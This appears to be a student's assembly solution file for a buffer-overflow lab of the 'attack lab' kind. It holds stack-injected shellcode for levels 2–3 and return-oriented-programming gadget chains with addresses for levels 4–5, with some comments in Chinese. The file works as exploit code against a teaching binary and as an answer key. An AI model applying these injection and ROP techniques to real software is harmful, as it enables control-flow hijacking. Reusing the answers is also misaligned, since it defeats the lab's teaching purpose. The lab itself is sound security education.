.demo:
    pushq $0xabcdef
    addq $17,%rax
    movl %eax,%edx

.level2:
    mov 0x6044e4,%rdi
    mov $0x004017ec,%rax # push touch1 call
    pushq %rax
    ret

.level2_better:
    sub $0x28,%rsp # restore stack to keep old data
    mov 0x6044e4,%rdi # set rdi to address of cookie
    pushq $0x004017ec
    ret

.level3:
    sub $0x28,%rsp # prevent stack being override by function call
    mov $0x5561dc94,%rdi # 进入pwngdb 可以查看我们字符串的位置，硬编码
    pushq %rbp # 无法对齐，导致 movaps 报错，定位了半天  NOTE: see https://pwn.elmo.sg/miscellaneous/movaps-issue.html
    pushq $0x004018fa # set rsp to address of touch3
    ret

.level4:
    # 0x4019a2
    mov %rax,%rdi
    ret 

    mov %rax,(%rdi)
    ret 

    # 0x4019ab
    popq %rax

    # 0x401999
    ret

    # target:
    mov 0x6044e4,%rdi
    mov $0x004017ec,%rax # push touch1 call
    pushq %rax
    ret

.level5:
    # 0x401a07
    movl %esp,%eax
    ret

    # 0x4019dd
    movl %eax,%edx
    nop
    ret

    # 0x401a13
    movl %ecx,%esi
    ret

    # 0x401a06
    mov %rsp,%rax
    ret

    # 0x401a69
    movl %edx,%ecx
    orb %bl,%bl
    ret


    sub $0x28,%rsp # prevent stack being override by function call
    mov $0x5561dc94,%rdi # 进入pwngdb 可以查看我们字符串的位置，硬编码
    pushq %rbp # 无法对齐，导致 movaps 报错，定位了半天  NOTE: see https://pwn.elmo.sg/miscellaneous/movaps-issue.html
    pushq $0x004018fa # set rsp to address of touch3
    ret

    mov %rsp,(%rdx)
    sub $0x10,%rsp
